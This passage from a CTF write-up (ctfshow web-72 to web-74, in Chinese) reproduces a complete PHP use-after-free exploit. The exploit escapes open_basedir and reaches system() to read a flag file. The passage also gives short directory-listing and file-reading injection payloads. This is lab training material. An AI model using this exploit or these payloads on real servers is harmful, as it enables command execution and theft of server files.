<h2 id="web-72（暂时还看不懂、open-basedir限制绕过、脚本uaf）"><a href="#web-72（暂时还看不懂、open-basedir限制绕过、脚本uaf）" class="headerlink" title="web-72（暂时还看不懂、open_basedir限制绕过、脚本uaf）"></a>web-72（暂时还看不懂、open_basedir限制绕过、脚本uaf）</h2><p><strong>暂时还看不懂</strong></p>
<p>找到flag0.txt 利用脚本uaf绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-<br>&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>   <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>   <br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>   <br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>   <br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>   <br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>   <br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123;<br>    <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123;<br>    <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>   <br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>   <br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>   <br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>   <br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>   <br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>   <br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>   <br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>   <br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br>   <br><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br>    &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>   <br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>}</p>
<hr>
<h2 id="web-73（reqadgzfile、var-export）"><a href="#web-73（reqadgzfile、var-export）" class="headerlink" title="web-73（reqadgzfile、var_export）"></a>web-73（reqadgzfile、var_export）</h2><p>payload如下： var_export(scandir(‘&#x2F;‘));<strong>本题没有open_basedir限制</strong>（也可以用上一题的UAF，但需改写相关关键字） 发现有flagc.txt 或者 echo(implode(‘ ‘,scandir(‘&#x2F;‘)));数组拼接为字符串 include,require包含失败 可用readgzfile(‘&#x2F;flagc.txt’); 拿到Flag</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">查看根目录文件<br>c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-keyword">exit</span>();<br><br>查看文件内容<br>c=readgzfile(<span class="hljs-string">&#x27;/flagc.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-74（glob伪协议、var-export）"><a href="#web-74（glob伪协议、var-export）" class="headerlink" title="web-74（glob伪协议、var_export）"></a>web-74（glob伪协议、var_export）</h2><p><strong>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</strong></p>
<p>payload：</p>
